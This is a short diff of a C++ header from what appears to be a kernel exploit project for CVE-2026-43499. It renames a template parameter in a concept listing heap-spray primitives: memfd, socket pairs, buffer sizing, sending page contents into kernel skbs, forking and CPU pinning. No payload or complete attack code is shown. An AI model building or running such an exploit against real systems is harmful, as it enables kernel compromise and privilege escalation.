@@ -32,26 +32,26 @@ namespace ghostlock::backend::cve_2026_43499::memory {
     }
 
     /** Every call a preparation makes on the platform. */
-    template <class Seam>
+    template <class Landing>
     concept HeapOps = requires(std::int32_t fd, std::int32_t *pair, std::int32_t bytes,
                                 std::size_t count, std::uint64_t pid, std::int32_t cpu,
                                 const void *data) {
-        { Seam::page_size() } -> std::same_as<OpsResult>;
-        { Seam::open_memfd(pid) } -> std::same_as<OpsResult>;
-        { Seam::close_fd(fd) } -> std::same_as<OpsResult>;
-        { Seam::socket_pair(pair) } -> std::same_as<OpsResult>;
-        { Seam::set_socket_buffer(fd, bytes) } -> std::same_as<OpsResult>;
-        { Seam::set_nonblocking(fd) } -> std::same_as<OpsResult>;
-        { Seam::send_buffer(fd, count) } -> std::same_as<OpsResult>;
+        { Landing::page_size() } -> std::same_as<OpsResult>;
+        { Landing::open_memfd(pid) } -> std::same_as<OpsResult>;
+        { Landing::close_fd(fd) } -> std::same_as<OpsResult>;
+        { Landing::socket_pair(pair) } -> std::same_as<OpsResult>;
+        { Landing::set_socket_buffer(fd, bytes) } -> std::same_as<OpsResult>;
+        { Landing::set_nonblocking(fd) } -> std::same_as<OpsResult>;
+        { Landing::send_buffer(fd, count) } -> std::same_as<OpsResult>;
         /* 带内容发送：页面必须走这条路进内核（退役的 sendmsg(skb_buf) ✓），
          *  否则内核里的 skb 是零、页面等于没放（本树此前正是如此 ✗）。 */
-        { Seam::send_bytes(fd, data, count) } -> std::same_as<OpsResult>;
-        { Seam::fork_child() } -> std::same_as<OpsResult>;
-        { Seam::stop_child(pid) } -> std::same_as<OpsResult>;
-        { Seam::yield_now() } -> std::same_as<OpsResult>;
-        { Seam::pin_to_processor(cpu) } -> std::same_as<OpsResult>;
+        { Landing::send_bytes(fd, data, count) } -> std::same_as<OpsResult>;
+        { Landing::fork_child() } -> std::same_as<OpsResult>;
+        { Landing::stop_child(pid) } -> std::same_as<OpsResult>;
+        { Landing::yield_now() } -> std::same_as<OpsResult>;
+        { Landing::pin_to_processor(cpu) } -> std::same_as<OpsResult>;
         /* A forked child has to be able to end itself: returning up the call stack in a
          *  child would run the caller code a second time. */
-        { Seam::exit_child() };
+        { Landing::exit_child() };
     };
 }  // namespace ghostlock::backend::cve_2026_43499::memory
